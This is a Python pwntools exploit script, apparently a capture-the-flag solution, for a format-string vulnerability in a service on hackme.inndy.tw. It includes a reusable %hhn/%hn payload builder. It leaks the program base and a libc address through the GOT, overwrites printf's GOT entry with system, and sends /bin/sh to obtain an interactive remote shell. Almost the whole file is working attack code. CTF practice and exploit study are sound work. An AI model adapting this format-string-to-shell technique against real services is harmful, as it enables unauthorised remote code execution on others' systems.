# -*- coding: utf-8 -*-
#!/usr/bin/env python
#   Version 
#   Author: WildfootW
#   GitHub: github.com/Wildfoot
#   Copyright (C) 2018 WildfootW All rights reserved.
#

# exploited

from pwn import *

class format_s:
    value_now = 0
    payload_string = b""

    def start(self):
        self.value_now = 0
        self.payload_string = b""
        return self

    def hhn(self, write_value, parameter_index):
        b = 0x100
        d = ((write_value - self.value_now) % b + b) % b
        if d == 0:
            self.payload_string += b"%%%d$hhn" % parameter_index
        else:
            self.payload_string += b"%%%dc%%%d$hhn" % (d, parameter_index)
        self.value_now += d
        return self

    def hn(self, write_value, parameter_index):
        b = 0x10000
        d = ((write_value - self.value_now) % b + b) % b
        if d == 0:
            self.payload_string += b"%%%d$hn" % parameter_index
        else:
            self.payload_string += b"%%%dc%%%d$hn" % (d, parameter_index)
        self.value_now += d
        return self

    def ljust(self, size, byte='\x00'):
        assert len(self.payload_string) <= size     # ljust is too short
        self.value_now += size - len(self.payload_string)
        self.payload_string = self.payload_string.ljust(size, byte)
        return self

    def append(self, append_s):
        self.value_now += len(append_s)
        self.payload_string += append_s
        return self

    def get(self):
        return self.payload_string

fmt = format_s()
# usage
# target_address = 0x60106c
# payload = fmt.start().hhn(0xda, 8).ljust(16, b"A").append(p64(target_address)).get()
# payload = fmt.start().hhn(0xfa, 12).hhn(0xce, 13).hhn(0xb0, 14).hhn(0x0c, 15).ljust((12 - 6) * 8, b"A").append(p64(target_address)).append(p64(target_address + 0x1)).append(p64(target_address + 0x2)).append(p64(target_address + 0x3)).get()

context.arch = "i386"
context.os = "linux"
context.endian = "little"
# ["CRITICAL", "DEBUG", "ERROR", "INFO", "NOTSET", "WARN", "WARNING"]
context.log_level = "DEBUG"

is_local = False

host = "hackme.inndy.tw"
port = 7712
glibc_onegadget_offset = 0xf0897
glibc_fgets_offset = 0x6da80
glibc_system_offset = 0x45380
if is_local:
    host = "127.0.0.1"
    port = 8888
    glibc_onegadget_offset = 0xf1147
    glibc_fgets_offset = 0x6dad0
    glibc_system_offset = 0x45390
r = remote(host, port)

input("Attach in gdb and press Enter")

def calculate_argument_num(stack_address):
    return str(int((stack_address - 0x7fffffffd820) / 8 + 6))

fgets_got_offset = 0x201030
exit_got_offset = 0x201048
system_got_offset = 0x201018
printf_got_offset = 0x201020

# leak_elf_base
payload = flat(["%" + calculate_argument_num(0x7fffffffd900) + "$lxWF"])
log.info("payload: " + str(payload))
r.sendline(payload)
elf_base = r.recvuntil("WF", drop = True)[:-3] + b"000"
elf_base = int(elf_base, 16)
log.info("base address: " + str(hex(elf_base)))
r.recv(512)

# leak_libc_address
payload = flat(["%7$sWFWF", p64(elf_base + fgets_got_offset)])
r.sendline(payload)
glibc_fgets = u64(r.recvuntil("WF", drop = True) + b"\x00\x00")
log.info("fgets address: " + str(hex(glibc_fgets)))
glibc_base = glibc_fgets - glibc_fgets_offset
log.info("glibc base: " + str(hex(glibc_base)))
r.recv(512)

# write one gadget in got
one_gadget_address = glibc_base + glibc_onegadget_offset
glibc_system_address = glibc_base + glibc_system_offset
exit_got_address = exit_got_offset + elf_base
system_got_address = system_got_offset + elf_base
fgets_got_address = fgets_got_offset + elf_base
printf_got_address = printf_got_offset + elf_base
log.info("one gadget: " + str(hex(one_gadget_address)))
log.info("system: " + str(hex(glibc_system_address)))
log.info("exit got address: " + str(hex(exit_got_address)))
log.info("system got address: " + str(hex(system_got_address)))
log.info("fgets got address: " + str(hex(fgets_got_address)))
log.info("printf got address: " + str(hex(printf_got_address)))
fmt.start()
P_offset = 18
for i in range(8):
    fmt.hhn(glibc_system_address >> (8 * i) & 0xff, P_offset)
    P_offset += 1
fmt.ljust(0x60, b"A")
for i in range(8):
    fmt.append(p64(printf_got_address + i))
payload = fmt.get()
log.info("payload: " + str(payload))
log.info("payload len: " + str(len(payload)))
r.sendline(payload)

# send /bin/sh
r.sendline(b"/bin/sh")

r.interactive("Pwned # ")

